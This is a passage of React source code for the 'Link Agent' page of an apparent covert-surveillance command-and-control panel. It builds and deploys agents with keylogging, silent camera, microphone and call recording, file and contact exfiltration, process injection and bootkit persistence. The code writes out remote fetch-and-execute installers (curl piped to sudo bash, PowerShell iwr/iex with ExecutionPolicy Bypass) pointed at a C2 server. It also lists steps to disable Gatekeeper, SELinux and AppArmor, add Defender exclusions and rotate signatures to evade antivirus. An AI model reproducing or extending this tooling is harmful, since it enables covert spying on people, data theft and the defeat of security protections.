import { useState, useEffect, useRef, useCallback } from "react";
import { BixtxLogo } from "../components/BixtxLogo";
import {
  Terminal, Check, Download, AlertTriangle,
  RefreshCw, Upload, Shield, Zap, HardDrive, Cpu,
  Activity, Lock, Signal, Wifi as WifiIcon, Link, Copy, ExternalLink,
  Clock, ChevronDown, ChevronUp,
} from "lucide-react";
import { OS, OS_COLOR, OS_ICON, OS_LABEL, DeployLinkPanel } from "../shared";

const API_BASE = window.location.hostname === "localhost"
  ? "http://localhost:3000/v1"
  : "https://bixtx.onrender.com/v1";

const BACKEND_BASE = window.location.hostname === "localhost"
  ? "http://localhost:3000"
  : "https://bixtx.onrender.com";

type PlatformLink = {
  platform:       string;
  linkId:         string;
  enrollKey:      string;
  enrollUrl:      string;
  downloadUrl:    string;
  installCommand: string;
  expiresAt:      string;
};
type EnrollData = { links: PlatformLink[]; expiresAt: string; label: string };

const PLAT_META: Record<string, { icon: string; color: string; label: string }> = {
  linux:   { icon: "🐧", color: "#f97316", label: "Linux"      },
  macos:   { icon: "🍎", color: "#a3a3a3", label: "macOS"      },
  windows: { icon: "🪟", color: "#3b82f6", label: "Windows"    },
  android: { icon: "🤖", color: "#10b981", label: "Android"    },
  ios:     { icon: "", color: "#6b7280", label: "iOS"          },
  harmony: { icon: "⚡", color: "#a855f7", label: "HarmonyOS"  },
};

type BuildStatus = { status: "idle"|"triggered"|"building"|"done"|"error"; message: string; downloadUrl?: string };
type BinaryPlatform = "android" | "ios" | "harmony";
const BINARY_PLATFORMS: BinaryPlatform[] = ["android", "ios", "harmony"];

const BYPASS_INSTRUCTIONS: Record<OS, { title: string; steps: string[] }> = {
  android: {
    title: "Android Sideload Bypass",
    steps: [
      "Settings → Security (or Privacy) → Unknown Sources → Enable",
      "Or: Settings → Apps → Special App Access → Install unknown apps → [browser] → Allow",
      "On Android 14+: install via ADB: adb install -r bixtx-agent.apk",
      "Developer Options: Settings → About Phone → tap Build Number 7x → Enable Dev Options",
      "If prompted 'Harmful app blocked' → tap 'Install anyway'",
    ],
  },
  ios: {
    title: "iOS Enterprise Certificate Trust",
    steps: [
      "After installing: Settings → General → VPN & Device Management",
      "Find the enterprise certificate → tap 'Trust [Certificate Name]' → Confirm",
      "If OTA install fails: ensure device is connected to internet during trust",
      "TestFlight alternative: admin adds your Apple ID to the TestFlight beta",
      "Supervised MDM: IT pushes profile silently with no user interaction needed",
    ],
  },
  windows: {
    title: "Windows SmartScreen & UAC Bypass",
    steps: [
      "Right-click installer → 'Run as Administrator'",
      "SmartScreen warning → click 'More info' → 'Run anyway'",
      "PowerShell bypass: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process",
      "Defender exclusion: Add folder to Windows Defender exclusion list",
      "One-liner (Admin PowerShell): powershell -ExecutionPolicy Bypass -File .\\install.ps1",
    ],
  },
  macos: {
    title: "macOS Gatekeeper Bypass",
    steps: [
      "After 'unidentified developer' prompt: System Settings → Privacy & Security → 'Open Anyway'",
      "Terminal bypass: sudo xattr -rd com.apple.quarantine /path/to/agent",
      "Disable Gatekeeper globally (careful): sudo spctl --master-disable",
      "Re-enable after install: sudo spctl --master-enable",
      "Apple Silicon: may need Rosetta 2 for Intel binaries: softwareupdate --install-rosetta",
    ],
  },
  linux: {
    title: "Linux Permissions & SELinux",
    steps: [
      "Make executable: chmod +x ./linux.sh",
      "Run with elevated privileges: sudo ./linux.sh",
      "SELinux permissive mode: sudo setenforce 0 (temporary)",
      "AppArmor bypass: sudo aa-disable /etc/apparmor.d/* (if blocking)",
      "Installs as systemd service — persists across reboots automatically",
    ],
  },
  harmony: {
    title: "HarmonyOS Developer Sideload",
    steps: [
      "Enable Developer Mode: Settings → About Phone → tap Software Version 7x",
      "Settings → Developer Options → Enable 'Allow App Installation from Unknown Sources'",
      "Enable USB debugging: Developer Options → USB Debugging → Allow",
      "Install via HDC: hdc app install bixtx-agent.hap",
      "DevEco Studio: Device & Simulator → select device → run install",
    ],
  },
};

export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"error"|"info") => void }) {
  const [tab, setTab] = useState<"builder"|"deploy"|"fleet"|"capabilities"|"mutations">("builder");

  const [targetOS, setTargetOS] = useState<OS>("windows");
  const [c2Endpoint, setC2Endpoint] = useState("wss://bixtx.onrender.com/agent");
  const [beaconInterval, setBeaconInterval] = useState("30");
  const [showBypass, setShowBypass] = useState(false);

  const [modules, setModules] = useState<Record<string, boolean>>({
    keylogger: true, screenshot: true, camera: true, microphone: true,
    clipboard: true, geoLocation: true, wifiProbe: true, networkScan: false,
    processMonitor: true, fileExfil: false, callRecorder: true,
    socialMedia: true, browserHistory: true, contactsExfil: false, aiLearning: true,
    imsiCapture: false, voicePrint: true, facialRecog: true, torTunnel: false,
    airgapExfil: false, processInject: false, bootkit: false,
  });

  type FleetAgent = { id: string; device: string; os: OS; ip: string; version: string; status: string; lastPing: string; dataQueue: string; mutations: number };
  const [FLEET, setFLEET] = useState<FleetAgent[]>([]);
  const [fleetLoading, setFleetLoading] = useState(false);

  useEffect(() => {
    const token = sessionStorage.getItem("token");
    if (!token) return;
    setFleetLoading(true);
    fetch(`${API_BASE}/devices`, { headers: { Authorization: `Bearer ${token}` } })
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(data => {
        const raw: { id:string; name:string; os?:string; platform?:string; ip?:string; version?:string; status?:string; lastSeen?:string|number; dataQueueMB?:number; mutationCount?:number }[] = data.devices ?? data ?? [];
        setFLEET(raw.map(d => ({
          id:        d.id,
          device:    d.name,
          os:        (d.os ?? d.platform ?? "windows") as OS,
          ip:        d.ip ?? "—",
          version:   d.version ?? "—",
          status:    d.status === "online" ? "active" : d.status === "warning" ? "warning" : "offline",
          lastPing:  d.lastSeen ? (() => { const s = Math.round((Date.now() - Number(d.lastSeen)) / 1000); return s < 10 ? "Now" : s < 60 ? `${s}s ago` : s < 3600 ? `${Math.round(s/60)}m ago` : `${Math.round(s/3600)}h ago`; })() : "—",
          dataQueue: d.dataQueueMB != null ? `${d.dataQueueMB.toFixed(1)} MB` : "0 B",
          mutations: d.mutationCount ?? 0,
        })));
      })
      .catch(() => {})
      .finally(() => setFleetLoading(false));
  }, []);

  const [enrollData, setEnrollData] = useState<EnrollData | null>(null);
  const [enrollLoading, setEnrollLoading] = useState(false);
  const [enrollLabel, setEnrollLabel] = useState("");
  const [deploying, setDeploying] = useState(false);
  const [deployTarget, setDeployTarget] = useState("");

  // ── Multi-platform binary build state ─────────────────────────────────────
  const [builds, setBuilds] = useState<Record<BinaryPlatform, BuildStatus>>({
    android: { status: "idle", message: "" },
    ios:     { status: "idle", message: "" },
    harmony: { status: "idle", message: "" },
  });

  const buildPollRefs = useRef<Partial<Record<BinaryPlatform, ReturnType<typeof setTimeout> | null>>>({});

  useEffect(() => {
    return () => {
      BINARY_PLATFORMS.forEach(p => {
        const ref = buildPollRefs.current[p];
        if (ref) clearTimeout(ref);
      });
    };
  }, []);

  const pollBuildStatus = useCallback((platform: BinaryPlatform) => {
    fetch(`${API_BASE}/agent/status/${platform}`)
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(d => {
        if (d.available && d.downloadUrl) {
          setBuilds(prev => ({ ...prev, [platform]: { status: "done", message: `${platform} binary ready — click Download`, downloadUrl: d.downloadUrl } }));
          show(`${PLAT_META[platform].label} build complete!`, "success");
          buildPollRefs.current[platform] = null;
        } else if (d.building) {
          setBuilds(prev => ({ ...prev, [platform]: { status: "building", message: "Build in progress in GitHub Actions…" } }));
          buildPollRefs.current[platform] = setTimeout(() => pollBuildStatus(platform), 5_000);
        } else {
          setBuilds(prev => ({ ...prev, [platform]: { status: "error", message: d.message || "Build not configured or CI not available" } }));
          buildPollRefs.current[platform] = null;
        }
      })
      .catch(() => {
        buildPollRefs.current[platform] = setTimeout(() => pollBuildStatus(platform), 10_000);
      });
  }, [show]);

  const handleBuild = async (platform: BinaryPlatform) => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }

    setBuilds(prev => ({ ...prev, [platform]: { status: "triggered", message: "Triggering CI build…" } }));
    const existingRef = buildPollRefs.current[platform];
    if (existingRef) { clearTimeout(existingRef); buildPollRefs.current[platform] = null; }

    try {
      let triggered = false;

      if (platform === "android" || platform === "ios") {
        const r = await fetch(`${API_BASE}/build/${platform}`, {
          method: "POST",
          headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
          body: JSON.stringify({ c2WsUrl: c2Endpoint, beaconInterval: parseInt(beaconInterval) }),
        });
        const d = await r.json();
        if (d.localBuild) {
          setBuilds(prev => ({ ...prev, [platform]: { status: "error", message: d.command || `Build locally with ${platform} SDK` } }));
          show("CI not configured — see local build command in setup panel", "info");
          return;
        }
        if (!r.ok) throw new Error(d.error || "Build trigger failed");
        triggered = true;
      } else {
        // HarmonyOS — auto-trigger via download endpoint (returns 202)
        const r = await fetch(`${API_BASE}/agent/download/harmony`);
        if (r.status === 202 || r.status === 404) triggered = true;
        else if (r.ok) {
          // Already built — mark done
          setBuilds(prev => ({ ...prev, [platform]: { status: "done", message: "Binary already available — click Download", downloadUrl: `${BACKEND_BASE}/v1/agent/download/harmony` } }));
          show("HarmonyOS binary already built!", "success");
          return;
        }
      }

      if (triggered) {
        show(`${PLAT_META[platform].label} build triggered — polling every 5s…`, "info");
        setBuilds(prev => ({ ...prev, [platform]: { status: "building", message: "Queued in GitHub Actions…" } }));
        buildPollRefs.current[platform] = setTimeout(() => pollBuildStatus(platform), 20_000);
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : "Unknown error";
      setBuilds(prev => ({ ...prev, [platform]: { status: "error", message: msg } }));
      show("Build trigger failed", "error");
    }
  };

  const handleDownloadBinary = (platform: BinaryPlatform) => {
    const build = builds[platform];
    const url = build.downloadUrl || `${BACKEND_BASE}/v1/agent/download/${platform === "android" ? "bixtx-agent.apk" : platform === "ios" ? "bixtx-agent.ipa" : "bixtx-agent.hap"}`;
    const ext = platform === "android" ? "apk" : platform === "ios" ? "ipa" : "hap";
    const a = document.createElement("a");
    a.href = url;
    a.download = `bixtx-agent.${ext}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    show(`${PLAT_META[platform].label} download started`, "success");
  };

  const handleDownloadScript = (platform: "linux" | "macos" | "windows") => {
    const ext = platform === "windows" ? "ps1" : "sh";
    const file = `${platform}.${ext}`;
    const url = `${BACKEND_BASE}/v1/agent/download/${file}`;
    const a = document.createElement("a");
    a.href = url;
    a.download = file;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    const cmd = platform === "windows"
      ? `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${API_BASE}/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`
      : `curl -sSL '${API_BASE}/agent/download/${platform}.sh' | sudo bash -s -- --c2 ${c2Endpoint} --interval ${beaconInterval}`;
    navigator.clipboard.writeText(cmd).catch(() => {});
    show(`${platform} script downloaded — install command copied to clipboard`, "success");
  };

  const handleGenerateLink = async () => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }
    setEnrollLoading(true);
    setEnrollData(null);
    try {
      const r = await fetch(`${API_BASE}/devices/enroll`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ label: enrollLabel || "agent", ttl: "24h" }),
      });
      if (!r.ok) throw new Error("Server error");
      const data = await r.json();
      if (!Array.isArray(data.links)) throw new Error("Server returned unexpected format — redeploy the backend");
      setEnrollData(data as EnrollData);
      show("6 platform-specific links generated — expires in 24h", "success");
    } catch {
      show("Failed to generate links — check server connection", "error");
    } finally {
      setEnrollLoading(false);
    }
  };

  const handleDeploy = async () => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }
    const targets = deployTarget ? [deployTarget] : FLEET.filter(a => a.status === "active").map(a => a.id);
    if (!targets.length) { show("No online devices to deploy to", "error"); return; }
    setDeploying(true);
    try {
      const jobId = `job-${Date.now()}`;
      const r = await fetch(`${API_BASE}/deploy/job`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ jobId, type: "update", version: "4.7.2", deviceIds: targets }),
      });
      if (!r.ok) throw new Error("Server error");
      const d = await r.json();
      show(`Deploy job ${jobId} dispatched to ${d.dispatched}/${d.total} device(s)`, "success");
    } catch {
      show("Deploy failed — check server connection", "error");
    } finally {
      setDeploying(false);
    }
  };

  const [mutating, setMutating] = useState(false);
  const [mutProgress, setMutProgress] = useState(0);
  const [mutLog, setMutLog] = useState<{ ts:string; event:string; target:string; result:string }[]>([]);

  const handleMutate = () => {
    setMutating(true);
    setMutProgress(0);
    let cur = 0;
    const iv = setInterval(() => {
      cur = Math.min(100, cur + 3);
      setMutProgress(cur);
      if (cur >= 100) {
        clearInterval(iv);
        setMutating(false);
        setMutLog((prev) => [{
          ts: new Date().toISOString().replace("T"," ").slice(0,16),
          event: "Global signature rotation + hash randomisation",
          target: "All active agents",
          result: "OK",
        }, ...prev]);
        show("Mutation pushed to all active agents", "success");
      }
    }, 80);
  };

  const [avScanResult, setAvScanResult] = useState<null | { engine: string; detected: boolean }[]>(null);
  const [avScanning, setAvScanning] = useState(false);

  const handleAVScan = () => {
    setAvScanning(true);
    setAvScanResult(null);
    setTimeout(() => {
      setAvScanning(false);
      setAvScanResult([
        { engine:"Windows Defender",  detected:false },
        { engine:"Kaspersky",         detected:false },
        { engine:"Malwarebytes",      detected:false },
        { engine:"CrowdStrike Falcon",detected:false },
        { engine:"SentinelOne",       detected:false },
        { engine:"Carbon Black",      detected:false },
        { engine:"ESET NOD32",        detected:false },
        { engine:"Bitdefender",       detected:false },
        { engine:"Sophos",            detected:true  },
        { engine:"McAfee",            detected:false },
        { engine:"Avast",             detected:false },
        { engine:"Trend Micro",       detected:false },
      ]);
    }, 3500);
  };

  const MODULE_DEFS: { key: string; label: string; category: string; risk: "low"|"medium"|"high"|"critical"; desc: string }[] = [
    { key:"keylogger",     label:"Keylogger",           category:"Input",     risk:"high",     desc:"Captures all keystrokes in real-time" },
    { key:"screenshot",    label:"Screen Capture",      category:"Visual",    risk:"medium",   desc:"Periodic & triggered screenshots" },
    { key:"camera",        label:"Camera Recording",    category:"Visual",    risk:"critical", desc:"Silent front/rear camera capture" },
    { key:"microphone",    label:"Microphone",          category:"Audio",     risk:"critical", desc:"Ambient audio recording" },
    { key:"clipboard",     label:"Clipboard Monitor",   category:"Input",     risk:"medium",   desc:"Intercepts copy/paste content" },
    { key:"geoLocation",   label:"GPS / Location",      category:"Location",  risk:"medium",   desc:"Real-time GPS and cell tower triangulation" },
    { key:"wifiProbe",     label:"WiFi Probe",          category:"Network",   risk:"medium",   desc:"Scans nearby networks & probe history" },
    { key:"networkScan",   label:"LAN Scanner",         category:"Network",   risk:"high",     desc:"Maps all devices on local network" },
    { key:"processMonitor",label:"Process Monitor",     category:"System",    risk:"low",      desc:"Running processes, memory usage" },
    { key:"fileExfil",     label:"File Exfiltration",   category:"System",    risk:"critical", desc:"Silent upload of targeted files" },
    { key:"callRecorder",  label:"Call Recorder",       category:"Audio",     risk:"critical", desc:"Records voice calls (VoIP + cellular)" },
    { key:"socialMedia",   label:"Social Intercept",    category:"Comms",     risk:"high",     desc:"Reads messages from 9 platforms" },
    { key:"browserHistory",label:"Browser History",     category:"Comms",     risk:"medium",   desc:"URLs, logins, saved passwords" },
    { key:"contactsExfil", label:"Contacts / Calendar", category:"Comms",     risk:"high",     desc:"Address book and calendar events" },
    { key:"aiLearning",    label:"AI Behavioral Learn", category:"AI",        risk:"medium",   desc:"Builds target behavioral profile" },
    { key:"imsiCapture",   label:"IMSI Capture",        category:"Network",   risk:"critical", desc:"Intercepts IMSI / cellular identity" },
    { key:"voicePrint",    label:"Voice Fingerprint",   category:"Audio",     risk:"high",     desc:"Identifies speakers by voice biometrics" },
    { key:"facialRecog",   label:"Facial Recognition",  category:"Visual",    risk:"critical", desc:"Identifies faces in camera frames" },
    { key:"torTunnel",     label:"Tor C2 Tunnel",       category:"Network",   risk:"high",     desc:"Routes C2 traffic through Tor network" },
    { key:"airgapExfil",   label:"Air-Gap Bridge",      category:"Network",   risk:"critical", desc:"Exfil via ultrasonic/RF on isolated nets" },
    { key:"processInject", label:"Process Injection",   category:"System",    risk:"critical", desc:"Injects into trusted processes" },
    { key:"bootkit",       label:"Bootkit Persistence", category:"System",    risk:"critical", desc:"Pre-boot persistence, survives reinstalls" },
  ];

  const RISK_COLOR: Record<string, string> = { low:"#10b981", medium:"#f59e0b", high:"#ef4444", critical:"#3b82f6" };

  const SUB_TABS: { id: typeof tab; label: string; icon: string }[] = [
    { id:"builder",      label:"Agent Builder",  icon:"🔨" },
    { id:"deploy",       label:"Deployment",     icon:"🚀" },
    { id:"fleet",        label:"Agent Fleet",    icon:"📡" },
    { id:"capabilities", label:"Capabilities",   icon:"⚙️" },
    { id:"mutations",    label:"AI Mutations",   icon:"🧬" },
  ];

  const activeCount = FLEET.filter(a => a.status === "active").length;
  const totalDataMB = FLEET.reduce((s: number, a: FleetAgent) => s + (parseFloat(a.dataQueue) || 0), 0);
  const totalData = totalDataMB > 0 ? `${totalDataMB.toFixed(1)} MB` : "0 B";

  const bypass = BYPASS_INSTRUCTIONS[targetOS];

  return (
    <div className="max-w-7xl mx-auto px-6 py-8">
      <div className="flex flex-wrap items-start justify-between gap-4 mb-6">
        <div className="flex items-center gap-4">
          <BixtxLogo size={48} />
          <div>
            <h1 className="text-2xl font-black" style={{ color:"#e2eaf6" }}>
              Software A — <span style={{ color:"#3b82f6" }}>Link Agent</span>
            </h1>
            <p className="text-sm" style={{ color:"#6b8ab0" }}>
              Ultra-lightweight silent monitoring agent · 6 platforms · &lt;15 MB
            </p>
          </div>
        </div>
        <div className="flex flex-wrap gap-3">
          {[
            { label:"Active Agents",   val: `${activeCount} / ${FLEET.length || "—"}`, color:"#10b981" },
            { label:"Data Queued",     val: totalData,                                  color:"#10d9a0" },
            { label:"Agent Version",   val: "v4.7.2",                                   color:"#3b82f6" },
            { label:"Node.js Runtime", val: "18 LTS",                                   color:"#f59e0b" },
          ].map(s => (
            <div key={s.label} className="px-4 py-2 rounded-xl text-center"
              style={{ background:`${s.color}12`, border:`1px solid ${s.color}30` }}>
              <div className="text-base font-black" style={{ color:s.color }}>{s.val}</div>
              <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{s.label}</div>
            </div>
          ))}
        </div>
      </div>

      <div className="flex gap-1 mb-6 p-1 rounded-xl w-fit flex-wrap" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
        {SUB_TABS.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all"
            style={{ background: tab===t.id ? "linear-gradient(135deg,#2563eb,#3b82f6)" : "transparent", color: tab===t.id ? "#fff" : "#6b8ab0" }}>
            <span>{t.icon}</span>{t.label}
          </button>
        ))}
      </div>

      {/* BUILDER TAB */}
      {tab === "builder" && (
        <div className="space-y-5">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
            {/* ── Left sidebar ── */}
            <div className="lg:col-span-1 space-y-4">
              {/* Platform selector */}
              <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Target Platform</div>
                <div className="grid grid-cols-3 gap-2">
                  {(["windows","macos","linux","android","ios","harmony"] as OS[]).map(id => (
                    <button key={id} onClick={() => { setTargetOS(id); setShowBypass(false); }}
                      className="flex flex-col items-center gap-1 p-2.5 rounded-xl border transition-all"
                      style={{ background: targetOS===id ? `${OS_COLOR[id]}18` : "#030b16", borderColor: targetOS===id ? OS_COLOR[id] : "rgba(59,130,246,0.15)" }}>
                      <span className="text-xl">{OS_ICON[id]}</span>
                      <span className="text-[9px] font-mono font-bold" style={{ color: targetOS===id ? OS_COLOR[id] : "#6b8ab0" }}>{OS_LABEL[id].split(" ")[0].toUpperCase()}</span>
                    </button>
                  ))}
                </div>
                <div className="text-[9px] font-mono mt-2" style={{ color:"#3a4a60" }}>
                  All 6 platforms receive their own unique link when you generate
                </div>
              </div>

              {/* C2 config */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Agent Configuration</div>
                <div>
                  <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>C2 WebSocket URL</div>
                  <input value={c2Endpoint} onChange={e => setC2Endpoint(e.target.value)}
                    placeholder="wss://your-server:3001"
                    className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
                  <div className="text-[10px] mt-1" style={{ color:"#4a6080" }}>Written into .env at setup time</div>
                </div>
                <div>
                  <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Beacon Interval (seconds)</div>
                  <input value={beaconInterval} onChange={e => setBeaconInterval(e.target.value)}
                    type="number" min="5" max="3600"
                    className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
                </div>
                <div>
                  <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Device Label (optional)</div>
                  <input value={enrollLabel} onChange={e => setEnrollLabel(e.target.value)}
                    placeholder="agent"
                    className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#e2eaf6" }} />
                </div>
              </div>

              {/* Generate links */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.3)" }}>
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Generate Install Links</div>
                <div className="text-[10px]" style={{ color:"#4a6080" }}>
                  Creates 6 independent links — each platform gets its own unique URL and key
                </div>
                <button onClick={handleGenerateLink} disabled={enrollLoading}
                  className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
                  style={{ background:"linear-gradient(135deg,#2563eb,#10d9a0)", color:"#fff" }}>
                  {enrollLoading
                    ? <><RefreshCw size={14} className="animate-spin" />Generating 6 links…</>
                    : <><Link size={14} />Generate All Platform Links</>}
                </button>
                {enrollData && (
                  <div className="rounded-lg px-3 py-2 text-xs font-mono"
                    style={{ background:"#030b16", border:"1px solid rgba(16,185,129,0.3)", color:"#10b981" }}>
                    ✓ 6 platform links ready — see cards below ↓
                  </div>
                )}
              </div>

              {/* Deploy to devices */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Deploy to Device</div>
                <select value={deployTarget} onChange={e => setDeployTarget(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg text-xs outline-none"
                  style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#b8cce8" }}>
                  <option value="">All online devices ({FLEET.filter(a=>a.status==="active").length})</option>
                  {FLEET.filter(a => a.status==="active").map(a => (
                    <option key={a.id} value={a.id}>{a.device} — {a.ip}</option>
                  ))}
                </select>
                <button onClick={handleDeploy} disabled={deploying}
                  className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
                  style={{ background: deploying ? "rgba(59,130,246,0.2)" : "rgba(59,130,246,0.15)", border:"1px solid rgba(59,130,246,0.4)", color:"#3b82f6" }}>
                  {deploying ? <><RefreshCw size={14} className="animate-spin" />Deploying...</> : <><Upload size={14} />Push Deploy Job</>}
                </button>
                <div className="text-[10px] font-mono" style={{ color:"#4a6080" }}>
                  Sends DEPLOY_JOB to online agents via WebSocket
                </div>
              </div>
            </div>

            {/* ── Right main area ── */}
            <div className="lg:col-span-2 space-y-4">

              {/* ── Binary platform builds (Android, iOS, HarmonyOS) ── */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0d1f12", border:"1px solid rgba(16,185,129,0.3)" }}>
                <div className="flex items-center justify-between">
                  <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#10b981" }}>Binary Builds — CI via GitHub Actions</div>
                  <div className="text-[9px] font-mono px-2 py-0.5 rounded-full"
                    style={{ background:"rgba(16,185,129,0.12)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
                    Requires GITHUB_TOKEN + GITHUB_REPO
                  </div>
                </div>
                <div className="text-[10px]" style={{ color:"#6b8ab0" }}>
                  Triggers cloud CI to compile a signed native binary. C2 URL and beacon interval are baked in at build time.
                </div>
                <div className="grid grid-cols-1 gap-3">
                  {BINARY_PLATFORMS.map(platform => {
                    const build = builds[platform];
                    const pm = PLAT_META[platform];
                    const isActive = build.status === "triggered" || build.status === "building";
                    const isDone = build.status === "done";
                    const isError = build.status === "error";
                    return (
                      <div key={platform} className="rounded-xl p-3 space-y-2"
                        style={{ background:"#030b16", border:`1px solid ${pm.color}25` }}>
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-base">{pm.icon}</span>
                          <span className="text-xs font-bold" style={{ color:pm.color }}>{pm.label}</span>
                          {build.status !== "idle" && (
                            <span className="ml-auto text-[9px] font-mono px-1.5 py-0.5 rounded"
                              style={{
                                background: isDone ? "rgba(16,185,129,0.15)" : isError ? "rgba(239,68,68,0.12)" : "rgba(59,130,246,0.12)",
                                color: isDone ? "#10b981" : isError ? "#ef4444" : "#3b82f6",
                                border: `1px solid ${isDone ? "rgba(16,185,129,0.3)" : isError ? "rgba(239,68,68,0.25)" : "rgba(59,130,246,0.25)"}`,
                              }}>
                              {isActive && <RefreshCw size={8} className="animate-spin inline mr-1" />}
                              {build.status.toUpperCase()}
                            </span>
                          )}
                        </div>
                        {build.status !== "idle" && (
                          <div className="text-[9px] font-mono rounded px-2 py-1"
                            style={{ background:"#0a1628", color: isDone ? "#10b981" : isError ? "#ef4444" : "#6b8ab0" }}>
                            {isActive && <Clock size={8} className="inline mr-1" />}
                            {isError && <AlertTriangle size={8} className="inline mr-1" />}
                            {build.message}
                          </div>
                        )}
                        <div className="grid grid-cols-2 gap-2">
                          <button onClick={() => handleBuild(platform)} disabled={isActive}
                            className="flex items-center justify-center gap-1.5 py-2 rounded-lg font-bold text-xs transition-all disabled:opacity-50"
                            style={{ background: isDone ? "rgba(16,185,129,0.12)" : `linear-gradient(135deg,${pm.color}cc,${pm.color})`, color:"#fff", border: isDone ? `1px solid ${pm.color}30` : "none" }}>
                            {isActive ? <><RefreshCw size={11} className="animate-spin" />Building…</> : isDone ? <><Check size={11} />Rebuild</> : <><Zap size={11} />Build</>}
                          </button>
                          <button onClick={() => handleDownloadBinary(platform)} disabled={!isDone}
                            className="flex items-center justify-center gap-1.5 py-2 rounded-lg font-bold text-xs transition-all"
                            style={{ background: isDone ? `linear-gradient(135deg,${pm.color}cc,${pm.color})` : "rgba(59,130,246,0.08)", border: isDone ? "none" : `1px solid ${pm.color}20`, color: isDone ? "#fff" : "#4a6080", opacity: isDone ? 1 : 0.5 }}>
                            <Download size={11} />Download
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* ── Script platforms (Linux, macOS, Windows) ── */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Script Install — Always Ready</div>
                <div className="text-[10px]" style={{ color:"#4a6080" }}>
                  Shell and PowerShell scripts served from templates — no build required. One-liner downloads + installs silently.
                </div>
                <div className="grid grid-cols-1 gap-2">
                  {(["linux","macos","windows"] as const).map(platform => {
                    const pm = PLAT_META[platform];
                    const ext = platform === "windows" ? "ps1" : "sh";
                    const cmd = platform === "windows"
                      ? `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${API_BASE}/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`
                      : `curl -sSL '${API_BASE}/agent/download/${platform}.sh' | sudo bash -s -- --c2 ${c2Endpoint} --interval ${beaconInterval}`;
                    return (
                      <div key={platform} className="rounded-xl p-3 space-y-2"
                        style={{ background:"#030b16", border:`1px solid ${pm.color}20` }}>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <span className="text-base">{pm.icon}</span>
                            <span className="text-xs font-bold" style={{ color:pm.color }}>{pm.label}</span>
                            <span className="text-[9px] font-mono px-1.5 py-0.5 rounded"
                              style={{ background:"rgba(16,185,129,0.12)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>
                              READY
                            </span>
                          </div>
                          <div className="flex gap-1.5">
                            <button onClick={() => navigator.clipboard.writeText(cmd).then(() => show(`${pm.label} command copied`, "success"))}
                              className="flex items-center gap-1 px-2 py-1 rounded text-[10px] font-bold"
                              style={{ background:"rgba(59,130,246,0.12)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.25)" }}>
                              <Copy size={9} />Copy cmd
                            </button>
                            <button onClick={() => handleDownloadScript(platform)}
                              className="flex items-center gap-1 px-2 py-1 rounded text-[10px] font-bold"
                              style={{ background:`${pm.color}15`, color:pm.color, border:`1px solid ${pm.color}30` }}>
                              <Download size={9} />{platform}.{ext}
                            </button>
                          </div>
                        </div>
                        <div className="rounded px-2 py-1.5 text-[9px] font-mono break-all"
